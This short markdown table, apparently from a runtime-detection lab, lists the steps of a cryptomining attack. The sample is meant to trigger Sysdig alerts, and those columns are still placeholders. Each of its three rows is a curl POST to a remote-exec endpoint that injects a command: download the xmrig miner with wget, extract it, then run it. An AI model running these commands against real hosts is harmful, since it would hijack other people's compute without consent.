# Steal Compute / Run Cryptominer Data flow

| Attack Step | Curl Command | Expected Sysdig Event |
|---|---|--|
| Download xmrig | `curl -X POST http://192.168.1.15/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'` | xxx |
| Extract xmrig | `curl -X POST http://192.168.1.15/exec -d 'command=tar -xzvf xmrig.tar.gz'` | xxx |
| Run xmrig | `curl -X POST http://192.168.1.15/exec -d 'command=/app/xmrig-6.18.1/xmrig'` | xxx |